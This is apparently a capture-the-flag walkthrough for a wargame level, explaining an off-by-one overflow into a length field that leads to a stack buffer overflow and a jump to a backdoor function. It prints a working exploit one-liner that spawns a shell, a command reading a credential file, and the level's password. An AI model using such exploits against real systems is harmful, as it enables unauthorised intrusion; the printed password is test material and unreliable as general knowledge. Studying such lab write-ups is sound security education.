Level09 Walkthrough - Complete Explanation
Overview
This level exploits a buffer overflow vulnerability by manipulating a length field to overflow the return address and jump to secret_backdoor function.
Vulnerability Analysis
1. Program Structure
The program has a struct allocated on the stack in handle_msg:
Offset 0x00-0x8b (0-139):   Message buffer (140 bytes)
Offset 0x8c-0xb3 (140-179): Username buffer (40 bytes)
Offset 0xb4-0xb7 (180-183): Length field (4 bytes integer)
2. The Vulnerability Chain
In set_username:

Reads up to 128 bytes from stdin using fgets
Copies characters one-by-one from local buffer to struct+0x8c
Loop condition: for(i=0; i<=0x28 && buffer[i]!=0; i++)
Bug: Loop goes from 0 to 40 inclusive, copying 41 bytes instead of 40
This allows 1 byte overflow into the length field at offset 0xb4!

In set_msg:

Reads up to 1024 bytes into local buffer
Uses strncpy(struct+0x0, local_buffer, struct->len) where len is at offset 0xb4
Bug: If we control the length field, we can make strncpy copy more than 140 bytes
This overflows the message buffer and overwrites the return address!

3. Exploitation Steps
Step 1: Overflow the length field

Send exactly 40 bytes + \xff character
The 41st byte (\xff = 255) overwrites the first byte of the length field
This makes the length huge (0x000000ff = 255 or larger depending on existing bytes)

Step 2: Overflow the return address

The message buffer is at rbp-0xc0
Return address is at rbp+0x8
Offset = 0xc0 + 0x8 = 200 bytes
Send 200 'A's + address of secret_backdoor

Step 3: Jump to secret_backdoor

secret_backdoor is at 0x88c (relative address)
With PIE enabled, base address is 0x555555554000
Full address: 0x555555554000 + 0x88c = 0x55555555488c
Little-endian format: \x8c\x48\x55\x55\x55\x55\x00\x00

Step 4: Execute shell command

secret_backdoor calls fgets() then system() with our input
We provide /bin/sh as input to get a shell

The Exploit
bash(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat) | ./level09
Breakdown:

'A' * 40 + '\xff' → Username (40 bytes + 1 byte overflow into length)
'\n' → Newline to submit username
'A' * 200 → Padding to reach return address
'\x8c\x48\x55\x55\x55\x55\x00\x00' → Address of secret_backdoor
'\n' → Newline to submit message
'/bin/sh' → Command for secret_backdoor to execute
cat → Keep stdin open for shell interaction

Getting the Password
Once you have the shell:
bashcat /home/users/end/.pass
Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Key Takeaways

Off-by-one errors (loop condition i<=40 instead of i<40) can lead to exploits
Integer overflow of length fields can cause massive buffer overflows
PIE (Position Independent Executable) changes addresses, but they're predictable
Always validate buffer sizes and use safe string functions